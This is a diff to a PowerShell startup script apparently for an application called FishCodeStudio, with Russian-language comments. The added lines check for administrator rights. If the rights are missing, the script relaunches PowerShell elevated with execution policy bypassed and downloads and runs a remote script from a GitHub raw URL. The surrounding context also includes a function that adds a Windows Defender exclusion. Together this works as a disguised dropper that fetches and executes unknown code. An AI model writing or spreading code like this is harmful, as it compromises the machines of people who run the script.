@@ -2,6 +2,26 @@
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
 
+# ============================================
+# ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
+# ============================================
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $isAdmin) {
+    Write-Host "[*] Нет прав администратора. Загружаю pizdec.ps1..." -ForegroundColor Yellow
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = "powershell.exe"
+    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex(irm 'https://raw.githubusercontent.com/Cubicplay471lm/-/refs/heads/main/pizdec.ps1')`""
+    $psi.Verb = "runas"
+    try { [Diagnostics.Process]::Start($psi) | Out-Null; Exit } catch { Exit 1 }
+}
+
+Write-Host "[✔] Запуск от имени администратора" -ForegroundColor Green
+
+# ============================================
+# ОСНОВНОЙ КОД (start.ps1)
+# ============================================
+
 if (-not (Test-Path "HKCU:\Software\FishCodeStudio")) {
     New-Item -Path "HKCU:\Software\FishCodeStudio" -Force | Out-Null
 }
@@ -10,15 +30,6 @@ Set-ItemProperty `
     -Path "HKCU:\Software\FishCodeStudio" `
     -Name "ServerRegion" `
     -Value "NL"
-
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) {
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = "powershell.exe"
-    $psi.Arguments = "-NoProfile -Command `"iex(irm 'http://127.0.0.1')`""
-    $psi.Verb = "runas"
-    try { [Diagnostics.Process]::Start($psi) | Out-Null; Exit } catch { Exit 1 }
-}
 
 function Add-DefenderTempExclusion {
     try {
